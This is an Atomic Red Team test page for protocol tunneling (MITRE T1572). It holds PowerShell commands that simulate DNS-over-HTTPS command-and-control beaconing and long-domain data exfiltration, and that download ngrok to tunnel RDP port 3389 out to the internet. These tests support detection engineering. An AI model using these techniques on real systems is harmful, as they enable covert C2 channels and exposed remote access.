---
tags: [T1572, atomic_test]
filename: "[[T1572 - Protocol Tunneling]]"
---
# T1572 - Protocol Tunneling

## Atomic Test #1 - DNS over HTTPS Large Query Volume
This test simulates an infected host sending a large volume of DoH queries to a command and control server.
The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.

**Supported Platforms:** Windows


**auto_generated_guid:** ae9ef4b0-d8c1-49d4-8758-06206f19af0a





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| doh_server | Default DoH resolver | string | https://8.8.8.8/resolve|
| query_type | DNS query type | string | TXT|
| subdomain | Subdomain prepended to the domain name | string | atomicredteam|
| query_volume | Number of DNS queries to send | integer | 1000|
| domain | Default domain to simulate against | string | 127.0.0.1.xip.io|


#### Attack Commands: Run with `powershell`! 


```powershell
for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
```






<br/>
<br/>

## Atomic Test #2 - DNS over HTTPS Regular Beaconing
This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.

**Supported Platforms:** Windows


**auto_generated_guid:** 0c5f9705-c575-42a6-9609-cbbff4b2fc9b





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| doh_server | Default DoH resolver | string | https://8.8.8.8/resolve|
| runtime | Time in minutes to run the simulation | integer | 30|
| domain | Default domain to simulate against | string | 127.0.0.1.xip.io|
| subdomain | Subdomain prepended to the domain name | string | atomicredteam|
| query_type | DNS query type | string | TXT|
| c2_interval | Seconds between C2 requests to the command and control server | integer | 30|
| c2_jitter | Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests | integer | 20|


#### Attack Commands: Run with `powershell`! 


```powershell
Set-Location "PathToAtomicsFolder"
.\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
```






<br/>
<br/>

## Atomic Test #3 - DNS over HTTPS Long Domain Query
This test simulates an infected host returning data to a command and control server using long domain names.
The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
 Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.

**Supported Platforms:** Windows


**auto_generated_guid:** 748a73d5-cea4-4f34-84d8-839da5baa99c





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| doh_server | Default DoH resolver | string | https://8.8.8.8/resolve|
| query_type | DNS query type | string | TXT|
| subdomain | Subdomain prepended to the domain name (should be 63 characters to test maximum length) | string | atomicredteamatomicredteamatomicredteamatomicredteamatomicredte|
| domain | Default domain to simulate against | string | 127.0.0.1.xip.io|


#### Attack Commands: Run with `powershell`! 


```powershell
Set-Location "PathToAtomicsFolder"
.\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
```






<br/>
<br/>

## Atomic Test #4 - run ngrok
Download and run ngrok. Create tunnel to chosen port.

**Supported Platforms:** Windows


**auto_generated_guid:** 4cdc9fc7-53fb-4894-9f0c-64836943ea60





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| api_token | ngrok API | string | N/A|
| port_num | port number for tunnel | integer | 3389|
| download | link to download ngrok | string | https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null
```

#### Cleanup Commands:
```powershell
Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
```



#### Dependencies:  Run with `powershell`!
##### Description: Download ngrok
##### Check Prereq Commands:
```powershell
if (Test-Path C:\Users\Public\ngrok) {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
Invoke-WebRequest #{download} -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok
```




<br/>
